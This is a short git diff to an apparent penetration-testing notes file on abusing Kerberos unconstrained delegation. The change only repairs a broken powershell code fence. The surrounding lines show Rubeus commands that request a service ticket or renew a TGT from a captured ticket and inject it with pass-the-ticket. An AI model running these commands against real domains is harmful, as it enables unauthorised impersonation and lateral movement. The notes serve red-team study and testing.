@@ -63,7 +63,8 @@ Check the `TRUSTED_FOR_DELEGATION` property.
   ```powershell                                                                                                                                                       
   .\Rubeus.exe asktgs /ticket:<Recieved Ticket> /service:<SPN> /ptt                                                                                                   
   ```                                                                                                                                                                 
-  If the above doesn't work, we use renew to get a brand new TGT instead of a TGS                                                                                       ```powershell                                                                                                                                                       
+  If the above doesn't work, we use renew to get a brand new TGT instead of a TGS
+  ```powershell
   .\Rubeus.exe renew /ticket:<ticket> /ptt                                                                                                                            
   ```
 
